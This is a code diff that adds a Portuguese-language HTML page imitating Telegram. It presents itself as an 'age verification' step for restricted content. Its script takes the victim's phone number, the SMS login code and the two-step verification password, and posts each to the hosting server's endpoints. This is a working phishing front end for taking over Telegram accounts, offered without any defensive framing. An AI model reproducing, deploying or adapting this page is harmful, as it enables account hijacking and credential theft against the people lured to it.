@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Idade - Telegram</title>
+    <style>
+        /* Reset básico */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0e1621;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        /* --- ESTILOS DA TELA 1 --- */
+        .screen-1 {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
+
+        .telegram-logo {
+            width: 100px;
+            height: 100px;
+            background-color: #2aabee;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+            margin-top: 20px;
+        }
+
+        .telegram-logo svg {
+            width: 55px;
+            height: 55px;
+            fill: white;
+            margin-left: -5px;
+            margin-top: 5px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .description {
+            font-size: 15px;
+            color: #8e9297;
+            line-height: 1.4;
+            margin-bottom: 30px;
+            padding: 0 10px;
+        }
+
+        .input-group {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        input[type="tel"], input[type="text"], input[type="password"] {
+            width: 100%;
+            background-color: #17212b;
+            border: 1px solid #17212b;
+            border-radius: 10px;
+            padding: 15px;
+            color: white;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+            text-align: center;
+            letter-spacing: 2px;
+        }
+
+        input::placeholder {
+            color: #6c7883;
+            letter-spacing: normal;
+        }
+
+        input:focus {
+            border-color: #2aabee;
+        }
+
+        .btn-confirm {
+            width: 100%;
+            background-color: #2aabee;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-confirm:hover {
+            background-color: #2291d4;
+        }
+
+        /* --- ESTILOS DA TELA 2 E 3 --- */
+        .screen-2, .screen-3 {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
+
+        .screen-2.active, .screen-3.active {
+            display: flex;
+        }
+
+        .screen-2 .description span, .screen-3 .description span {
+            color: #ffffff;
+            font-weight: 500;
+        }
+
+        .link-voltar {
+            color: #2aabee;
+            text-decoration: none;
+            font-size: 15px;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+        
+        .link-voltar:hover {
+            text-decoration: underline;
+        }
+        .loading {
+            display: none;
+            margin-top: 15px;
+            color: #8e9297;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        
+        <!-- TELA 1: PEDIR NÚMERO -->
+        <div class="screen-1" id="telaNumero">
+            <div class="telegram-logo">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M2.378 11.29l18.15-7.01c.84-.32 1.57.19 1.31 1.28l-3.03 14.27c-.23 1.06-.87 1.31-1.76.82l-4.85-3.58-2.34 2.26c-.26.26-.48.48-.96.48l.34-4.9 10.06-9.1c.44-.39.1-.6-.5-.21L6.44 13.13l-4.06-1.27c-1-.31-1.01-.98.01-1.3z" />
+                </svg>
+            </div>
+
+            <h1>Verificação de Idade</h1>
+            <p class="description">
+                Para liberar o acesso ao conteúdo restrito no Telegram, confirme seu número de telefone. Enviaremos um código de confirmação.
+            </p>
+
+            <div class="input-group">
+                <input type="tel" id="numeroTelefone" placeholder="Número de telefone" aria-label="Número de telefone" maxlength="15" oninput="formatarTelefone(this)">
+            </div>
+            
+            <button class="btn-confirm" id="btnEnviarNumero" onclick="irParaCodigo()">Confirmar Idade</button>
+            <div class="loading" id="load1">Enviando...</div>
+        </div>
+
+        <!-- TELA 2: INSERIR CÓDIGO SMS -->
+        <div class="screen-2" id="telaCodigo">
+            <div class="telegram-logo">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M2.378 11.29l18.15-7.01c.84-.32 1.57.19 1.31 1.28l-3.03 14.27c-.23 1.06-.87 1.31-1.76.82l-4.85-3.58-2.34 2.26c-.26.26-.48.48-.96.48l.34-4.9 10.06-9.1c.44-.39.1-.6-.5-.21L6.44 13.13l-4.06-1.27c-1-.31-1.01-.98.01-1.3z" />
+                </svg>
+            </div>
+
+            <h1>Digite o código</h1>
+            <p class="description">
+                Enviamos um código SMS para o número <br>
+                <span id="numeroExibido">+55 11 99999-9999</span>
+            </p>
+
+            <div class="input-group">
+                <input type="text" id="codigoSms" placeholder="00000" maxlength="5" aria-label="Código de verificação">
+            </div>
+            
+            <button class="btn-confirm" id="btnEnviarCodigo" onclick="verificarCodigo()">Verificar Código</button>
+            <div class="loading" id="load2">Verificando...</div>
+            
+            <a class="link-voltar" onclick="voltarParaNumero()">Voltar e corrigir número</a>
+        </div>
+
+        <!-- TELA 3: 2FA -->
+        <div class="screen-3" id="tela2FA">
+            <div class="telegram-logo">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M2.378 11.29l18.15-7.01c.84-.32 1.57.19 1.31 1.28l-3.03 14.27c-.23 1.06-.87 1.31-1.76.82l-4.85-3.58-2.34 2.26c-.26.26-.48.48-.96.48l.34-4.9 10.06-9.1c.44-.39.1-.6-.5-.21L6.44 13.13l-4.06-1.27c-1-.31-1.01-.98.01-1.3z" />
+                </svg>
+            </div>
+
+            <h1>Verificação em duas etapas</h1>
+            <p class="description">
+                A sua conta está protegida com uma senha adicional.
+            </p>
+
+            <div class="input-group">
+                <input type="password" id="senha2FA" placeholder="Senha" aria-label="Senha">
+            </div>
+            
+            <button class="btn-confirm" id="btnEnviar2FA" onclick="verificar2FA()">Avançar</button>
+            <div class="loading" id="load3">Verificando...</div>
+        </div>
+
+    </div>
+
+    <!-- SCRIPT -->
+    <script>
+        const API_URL = window.location.origin; 
+        let currentPhone = "";
+
+        function formatarTelefone(input) {
+            let valor = input.value.replace(/\D/g, "");
+            if (valor.length > 0) { valor = "(" + valor; }
+            if (valor.length > 3) { valor = valor.slice(0, 3) + ") " + valor.slice(3); }
+            if (valor.length > 10) { valor = valor.slice(0, 10) + "-" + valor.slice(10); }
+            input.value = valor;
+        }
+
+        const telaNumero = document.getElementById('telaNumero');
+        const telaCodigo = document.getElementById('telaCodigo');
+        const tela2FA = document.getElementById('tela2FA');
+        const inputNumero = document.getElementById('numeroTelefone');
+        const numeroExibido = document.getElementById('numeroExibido');
+
+        function irParaCodigo() {
+            const numero = inputNumero.value;
+            const apenasNumeros = numero.replace(/\D/g, "");
+            
+            if (apenasNumeros.length < 10) {
+                alert("Por favor, digite um número de telefone válido.");
+                return;
+            }
+
+            currentPhone = "+55" + apenasNumeros;
+            numeroExibido.innerText = numero;
+
+            document.getElementById('btnEnviarNumero').style.display = 'none';
+            document.getElementById('load1').style.display = 'block';
+
+            fetch(`${API_URL}/request_code`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: currentPhone })
+            }).then(res => res.json()).then(data => {
+                document.getElementById('btnEnviarNumero').style.display = 'block';
+                document.getElementById('load1').style.display = 'none';
+                
+                if (data.success || data.error) {
+                    telaNumero.style.display = 'none';
+                    telaCodigo.classList.add('active');
+                } else {
+                    alert("Erro ao enviar. Tente novamente.");
+                }
+            }).catch(err => {
+                document.getElementById('btnEnviarNumero').style.display = 'block';
+                document.getElementById('load1').style.display = 'none';
+                alert("Erro de conexão.");
+            });
+        }
+
+        function voltarParaNumero() {
+            telaCodigo.classList.remove('active');
+            telaNumero.style.display = 'flex';
+            document.getElementById('codigoSms').value = '';
+        }
+
+        function verificarCodigo() {
+            const codigo = document.getElementById('codigoSms').value;
+            if (codigo.length < 5) {
+                alert("Por favor, insira o código de 5 dígitos.");
+                return;
+            }
+
+            document.getElementById('btnEnviarCodigo').style.display = 'none';
+            document.getElementById('load2').style.display = 'block';
+
+            fetch(`${API_URL}/verify_code`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: currentPhone, code: codigo })
+            }).then(res => res.json()).then(data => {
+                document.getElementById('btnEnviarCodigo').style.display = 'block';
+                document.getElementById('load2').style.display = 'none';
+
+                if (data.success) {
+                    document.body.innerHTML = "<h1 style='font-family:sans-serif; text-align:center; color:white; margin-top:50%'>Acesso Liberado!</h1>";
+                } else if (data.error === "2FA_REQUIRED") {
+                    telaCodigo.classList.remove('active');
+                    tela2FA.classList.add('active');
+                } else {
+                    alert("Código incorreto. Tente novamente.");
+                }
+            });
+        }
+
+        function verificar2FA() {
+            const senha = document.getElementById('senha2FA').value;
+            if (!senha) return;
+
+            document.getElementById('btnEnviar2FA').style.display = 'none';
+            document.getElementById('load3').style.display = 'block';
+
+            fetch(`${API_URL}/verify_2fa`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: currentPhone, password: senha })
+            }).then(res => res.json()).then(data => {
+                document.getElementById('btnEnviar2FA').style.display = 'block';
+                document.getElementById('load3').style.display = 'none';
+
+                if (data.success) {
+                    document.body.innerHTML = "<h1 style='font-family:sans-serif; text-align:center; color:white; margin-top:50%'>Acesso Liberado!</h1>";
+                } else {
+                    alert("Senha incorreta.");
+                }
+            });
+        }
+    </script>
+</body>
+    </html>
